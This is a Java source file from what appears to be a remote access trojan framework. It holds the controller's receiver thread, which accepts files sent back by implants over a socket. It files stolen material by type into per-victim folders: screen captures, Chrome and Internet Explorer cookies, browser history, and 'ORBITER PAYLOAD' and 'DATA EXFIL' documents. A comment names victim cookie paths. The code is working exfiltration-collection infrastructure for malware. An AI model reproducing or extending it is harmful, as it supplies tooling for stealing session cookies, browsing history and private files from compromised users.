/**
 * @author Solomon Sonya
 */

package Implant.FTP;


import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;
import javax.swing.*;

import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_TextDisplayPane;
import Controller.GUI.Splinter_GUI;
import Implant.Driver;
import java.awt.*;

public class FTP_Thread_Receiver extends Thread implements Runnable
{

	static String strMyClassName = "FTP_Thread_Receiver";
	
	String strConnectionTimeStamp = "UNKNOWN";
	String strReadStartTime = "UNKNOWN";
	String strReadStopTime = "UNKNOWN";
	String strIPAddress = "";
	int hostPort = 0;
	
	long beginFileTransferTime = 1;
	long endFileTransferTime = 1;
	

	
	int readBufferSize = 20480;
	
	long bytesReadFromSocket = 0;
	
	DataInputStream dis_SktConnection = null;
	DataOutputStream dos_SktConnection = null; 
	FileOutputStream fos_ReceivedFile = null;
	
	byte [] arrReceiveFile_ByteArray = null;
	int bytesReadFromBuffer = 0;
	long totalBytesRead = 0;
	
	BufferedOutputStream brOutFile = null;
	FileOutputStream fos_OutFile = null; 
	
	boolean receiveFile = false; 
	
	Socket sktConnection = null;
	boolean i_am_implant_daemon = false;
	boolean i_am_controller_daemon = false;
	
	//READ OVERHEAD
	String implantTyp ="";
	String fileName = "";
	String fileSze = "";
	
	int implantType = 0;
	long fileSize = 0;
	
	File mySavePath = null;
	
	boolean savingSpecialType = false;
	boolean savingScreenCapture = false;
	boolean savingCookies_Chrome = false;
	boolean savingCookies_InternetExplorer = false;
	boolean savingBrowserHistory_Chrome = false;
	boolean savingBrowserHistory_InternetExplorer = false;
	boolean savingOrbitingPayload_ExfiltratedFiles = false;
	boolean savingDataExfilPayload_ExfiltratedFiles = false;
	
	
	
	
	public FTP_Thread_Receiver(boolean im_implant_daemon, boolean im_controller_daemon, Socket skt)
	{
		sktConnection = skt;
		i_am_implant_daemon = im_implant_daemon;
		i_am_controller_daemon = im_controller_daemon;
	}
	
	public void run()
	{
		try
		{
			Drivers.sop("Connection Established to receive this FTP File on: " + sktConnection.getInetAddress() + " : " + sktConnection.getPort());//Connected Agent's IP
			
			strIPAddress = ""+ sktConnection.getInetAddress();
			hostPort = sktConnection.getLocalPort();
			if(hostPort < 0)
				hostPort = 80;
			
			String prev = strIPAddress;
			
			try
			{
				strIPAddress = strIPAddress.replace("/", "");
				
				prev = strIPAddress;
				
				strIPAddress = strIPAddress.replace("\\", "");
			}catch(Exception e){strIPAddress = prev;}
			
			receiveFile();
		}
		
		catch(Exception e)
		{
			Drivers.eop("run", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		//done, close streams, and move self from arraylist
		//Close the streams
		
				try
				{
					Drivers.sop("Closing Receiving streams for IP: " + this.strIPAddress);			
					
					if(dis_SktConnection != null)
						dis_SktConnection.close();
					
					if(dos_SktConnection != null)
						dos_SktConnection.close();
					
					if(fos_ReceivedFile != null)
						fos_ReceivedFile.close();
					
					if(sktConnection != null && sktConnection.isConnected())
						sktConnection.close();
					//brOutFile.close();
				}
				
				catch(Exception e)
				{
					
				}
		
		try
		{
			if(Driver.alConnectedFTPClients != null && Driver.alConnectedFTPClients.contains(this))
			{
				Driver.alConnectedFTPClients.remove(this);
			}
		}catch(Exception e){}
		
	}//end run
	
	
	public boolean receiveFile()
	{
		try
		{
			beginFileTransferTime = System.currentTimeMillis();//get the current time in milliseconds
			strReadStartTime = Drivers.getTimeStamp_Without_Date();
			
			Drivers.sp("Attempting to open streams on this socket...");
			
			//open streams from agent
			dis_SktConnection = new DataInputStream(sktConnection.getInputStream());
			dos_SktConnection = new DataOutputStream(sktConnection.getOutputStream());
			
			Drivers.sop("Streams opened.  Proceeding with handshake...");
			
			String strHandshake = dis_SktConnection.readUTF();
			
			//Format: [implant type]#####[file name]%%%%%[file size]
			
			//ensure stream not closed prematurely before sending a single line:
			if(strHandshake == null)
			{				
				//return false;
				throw new SocketException("Null line received");
			}
			
			String []arrHandShake = strHandshake.split(Driver.delimeter_1);
			
			//Ensure overhead is correct
			if(arrHandShake.length == 4)//updated file sender to include the type of file returned, e.g. special identification if we're sending cookie files or screencaptures,etc
			{
				//READ OVERHEAD
				implantTyp = arrHandShake[0];
				fileName = arrHandShake[1];
				fileSze = arrHandShake[2];
				
				//next determine if we're saving specially
				
				/*************************************************************************
				 * ORDINARY FILE - DO NOT CREATE SPECIAL DIRECTORY
				 *************************************************************************/
				if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_ORDINARY))
				{
					savingSpecialType = false;					
				}
				
				
				/*************************************************************************
				 * SCREEN CAPTURES
				 *************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES))
				{
					savingSpecialType = true;
					savingScreenCapture = true;
				}
				
				/*************************************************************************
				 * COOKIES - INTERNET EXPLORER
				 *************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_COOKIES_INTERNET_EXPLORER))
				{
					savingSpecialType = true;
					savingCookies_InternetExplorer = true;
				}
				
				/*************************************************************************
				 * COOKIES - CHROME
				 *************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_COOKIES_CHROME))
				{
					savingSpecialType = true;
					savingCookies_Chrome = true;
				}
				
				/*************************************************************************
				 * BROWSING HISTORY - INTERNET EXPLORER
				 *************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_BROWSER_HISTORY_INTERNET_EXPLORER))
				{
					savingSpecialType = true;
					savingBrowserHistory_InternetExplorer = true;
				}
				
				/*************************************************************************
				 * BROWSING HISTORY - CHROME
				 *************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_BROWSER_HISTORY_CHROME))
				{
					savingSpecialType = true;
					savingBrowserHistory_Chrome = true;
				}
				
				/********************************************************************************
				 * ORBITER PAYLOAD - 
				 * arrHandShake[3] == FILE_TYPE_ORBITER_PAYLOAD
				 * arrHandShake[4] == PATH TO DIRECTORY
				 * arrHandShake[5] == FILE TYPE BEING EXTRACTED (DOC, PDF, TXT, ETC, OR ALL)
				 ********************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_ORBITER_PAYLOAD))
				{
					savingSpecialType = true;
					savingOrbitingPayload_ExfiltratedFiles = true;
				}
				
				/********************************************************************************
				 * DATA EXFIL
				 ********************************************************************************/
				else if(arrHandShake[3] != null && arrHandShake[3].trim().equalsIgnoreCase(FTP_ServerSocket.FILE_TYPE_DATA_EXFIL))
				{
					savingSpecialType = true;
					savingDataExfilPayload_ExfiltratedFiles = true;
				}
								
				
				
				
			}
			else if(arrHandShake.length == 3)
			{
				//READ OVERHEAD
				implantTyp = arrHandShake[0];
				fileName = arrHandShake[1];
				fileSze = arrHandShake[2];
			}
			else
			{
				throw new NumberFormatException("Invalid parameters received from " +  strIPAddress + " Closing the Streams...");
			}
			
			
			
			//ensure valid data received
			
			try
			{
				implantType = Integer.parseInt(implantTyp);
				fileSize = Long.parseLong(fileSze);
				if(fileName == null || fileName.trim().equals(""))
				{
					throw new NumberFormatException("Invalid File Name received");
				}
				
			}
			catch(Exception e)
			{
				//handle these exceptions in the nfe exception below
				throw new NumberFormatException(e.getLocalizedMessage());
			}
			
			String abbreviatedFileSize = Driver.getFormattedFileSize_String(fileSize);
			
			//check if we're querying the user to accept file
			if(!Driver.autoAcceptFTP_Files)
			{
				if(i_am_controller_daemon)
				{
					String Notification = "* * * New File Received * * *"
							+ "\nConnection IP: " + sktConnection.getInetAddress() + " : " + sktConnection.getLocalPort() 
							+ "\nFile Name: " + fileName 
							+ "\nFile Size: " + abbreviatedFileSize
							+ "\n\nDo you wish to Accept this File?";
					
					if(Drivers.jop_Confirm(Notification, "Download File") != JOptionPane.YES_OPTION)
					{
						Drivers.sop("User chose not to accept file: " + fileName + " from " + sktConnection.getInetAddress() + ". Closing streams...");
						return false;
					}
					else//user accepted to read the file!
					{
						this.receiveFile = true;
						
						//ensure we have a file save path
						if(Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory())
						{
							Driver.jop("Unable to save file.  FTP FileHive is incorrect");
							return false;
						}
						
						//Drivers.jop("READY TO RECEIVE FILE SIR!");
					}
				}
			}
			
			else//auto receive is enabled, accept the file!
			{
				receiveFile = true;
			}
			
			//receive the file
			if(this.receiveFile)
			{
				//Alert to continue!
				dos_SktConnection.writeUTF("PROCEED");
				dos_SktConnection.flush();
				
				fileName = ""+System.currentTimeMillis() + "_" + fileName;
										
				//we're going to overwrite duplicate files for right now
				/*Drivers.sop("Attempting to save File \"" + fileName + "\" at location: "  + Driver.fleFTP_FileHiveDirectory.getCanonicalPath());
				
				String myOutFilePath = "";
				
				if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
					myOutFilePath = Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + fileName;
				else
					myOutFilePath = Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + Driver.fileSeperator + fileName;
				
				Drivers.sop("Attempting to create file: " + myOutFilePath);*/ //2013-02-21 solo edit
				
				try
				{
					if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
						this.mySavePath = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + this.strIPAddress + "_" + hostPort);
					else
						this.mySavePath = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + Driver.fileSeperator + this.strIPAddress + "_" + hostPort);
									
					
					//test if the directory already exists
					boolean directoryExists = true;
					if(!this.mySavePath.exists() && !this.mySavePath.isDirectory())
					{
						//attempt to create the directory
						directoryExists = this.mySavePath.mkdir();
					}
					
					if(!directoryExists)
					{
						throw new Exception("Could not create directory!!! in " + this.strMyClassName);
					}
					
					/********************************************************************************
					 * 
					 * 
					 * check if we're saving special files, eg. browsing history, cookies, etc
					 * 
					 * 
					 *******************************************************************************/
					if(directoryExists && this.savingSpecialType)
					{
						/*************************************************************************
						 * SCREEN CAPTURE / SCREEN SCRAPE / SCREEN RECORD
						 *************************************************************************/
						if(this.savingScreenCapture)
						{
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "SCREEN CAPTURE");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "SCREEN CAPTURE");
						}
						
						/*************************************************************************
						 * COOKIE - CHROME
						 *************************************************************************/						
						else if(this.savingCookies_Chrome)
						{
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "Chrome_Cookies");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "Chrome_Cookies");
						}
						
						/*************************************************************************
						 * COOKIE - INTERNET EXPLORER
						 *************************************************************************/						
						else if(this.savingCookies_InternetExplorer)
						{
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "IE_Cookies");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "IE_Cookies");
							
							/**
							 * C:\Users\Hans\AppData\Roaming\Microsoft\Windows\Cookies

								and

								C:\Users\Hans\AppData\Local\Microsoft\Windows\Temporary Internet Files
							 */
						}
						
						/*************************************************************************
						 * BROWSING HISTORY - CHROME
						 *************************************************************************/
						else if(this.savingBrowserHistory_Chrome)
						{
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "Chrome_History");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath()+ Driver.fileSeperator + "Chrome_History");
						}
						
						/*************************************************************************
						 * BROWSING HISTORY - INTERNET EXPLORER
						 *************************************************************************/
						else if(this.savingBrowserHistory_InternetExplorer)
						{
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "IE_History");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator+ "IE_History");
						}
						
						/*************************************************************************
						 * ORBITING DIRECTORY
						 *************************************************************************/
						else if(this.savingOrbitingPayload_ExfiltratedFiles)
						{
							//NEED TO COME HERE AND SPECIFY THE FILES BY TYPE AND DIRECTORY NAME
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "ORBITER PAYLOAD");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "ORBITER PAYLOAD");
						}
						
						/*************************************************************************
						 * DATA EXFIL
						 *************************************************************************/
						else if(this.savingDataExfilPayload_ExfiltratedFiles)
						{
							//NEED TO COME HERE AND SPECIFY THE FILES BY TYPE AND DIRECTORY NAME
							if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + "DATA EXFIL");
							else
								this.mySavePath = new File(this.mySavePath.getCanonicalPath() + Driver.fileSeperator + "DATA EXFIL");
						}
						
						
						/*************************************************************************
						 * CREATE THE DIRECTORY
						 *************************************************************************/
						if(!this.mySavePath.exists() || !this.mySavePath.isDirectory())
						{
							//attempt to create the directory
							directoryExists = this.mySavePath.mkdir();
						}
						
						if(!directoryExists)
						{
							throw new Exception("Could not create directory!!! in " + this.strMyClassName);
						}
					}
					
					//otherwise, we created the directory for this connection!
					
				}catch(Exception e)
				{
					Driver.sop("Error Trying to create directory. Reverting to path: " + Driver.fleFTP_FileHiveDirectory.getCanonicalPath()); 
					this.mySavePath = Driver.fleFTP_FileHiveDirectory;
				}
				
				Drivers.sop("Attempting to save File \"" + fileName + "\" at location: "  + mySavePath);
				
				String myOutFilePath = "";
				
				if(this.mySavePath.getCanonicalPath().endsWith(Driver.fileSeperator))
					myOutFilePath = Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + fileName;
				else
					myOutFilePath = this.mySavePath.getCanonicalPath() + Driver.fileSeperator + fileName;
				
				Drivers.sop("Attempting to create file: " + myOutFilePath);
				
				//Actually create the file to be written to:
				fos_ReceivedFile =  new FileOutputStream(myOutFilePath);
				
				Drivers.sop("Looks like file creation was successful. initializing buffer arrays");
				
				//initialize the byte array
				arrReceiveFile_ByteArray = new byte[readBufferSize];
				totalBytesRead = 0;
				
				//NOTE, WE'LL HAVE TO FIX THE BELOW TO HAVE THE READ IN INTERRUPT TIMERS, BUT FOR NOW, PROCEED WITH THE WHILE LOOP!

				//READ the file!
				while((bytesReadFromBuffer = dis_SktConnection.read(arrReceiveFile_ByteArray, 0, readBufferSize)) > 0 && !sktConnection.isClosed())
				{
					//WRITE WHAT WE JUST READ OUT TO DISK
					fos_ReceivedFile.write(arrReceiveFile_ByteArray, 0, bytesReadFromBuffer);
					fos_ReceivedFile.flush();
					
					//increment total bytes read if we're not at the end of the file buffer
					if(bytesReadFromBuffer >= 0) 
						totalBytesRead += bytesReadFromBuffer;	
				}
				
				//HERE, FILE WAS RECEIVED!!!
				if(this.i_am_controller_daemon)
				{
					Drivers.sop("File writing complete. Closing streams...Total Bytes written: " +Driver.getFormattedFileSize_String(totalBytesRead) + " out of expected: " + Driver.getFormattedFileSize_String(fileSze));
					
					Drivers.txtpne_broadcastMessageBoard.appendStatusMessageString(true, "File received from: " + sktConnection.getInetAddress() +  " saved at location: " + myOutFilePath);
					
				}
					
				else
				{
					Drivers.sop("File writing complete. Closing streams...Total Bytes written: " +Driver.getFormattedFileSize_String(totalBytesRead) + " out of expected: " + fileSze);
				}
				
				
				
				//save calculation times
				this.endFileTransferTime = System.currentTimeMillis();//get the current time in milliseconds
				
			}
			
			return true;
		}//end try
		
		catch(EOFException eof)
		{
			Drivers.sop("Unable to complete action with implant at " + strIPAddress + " the socket has been closed");
		}
		
		catch(ArrayIndexOutOfBoundsException aob)
		{
			Drivers.sop("Invalid parameters received from " +  strIPAddress + " Closing the Streams...");
		}
		
		catch(NumberFormatException nfe)
		{
			//Drivers.sop(nfe.getLocalizedMessage());
			Drivers.sop("Invalid parameters received from " +  strIPAddress + " Closing the Streams...");
		}
		
		catch(SocketException se)
		{
			Drivers.sop("Unable to complete action with implant at " + strIPAddress + " the socket has been closed");
		}
		
		catch(Exception e)
		{
			Drivers.eop("receiveFile", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
}
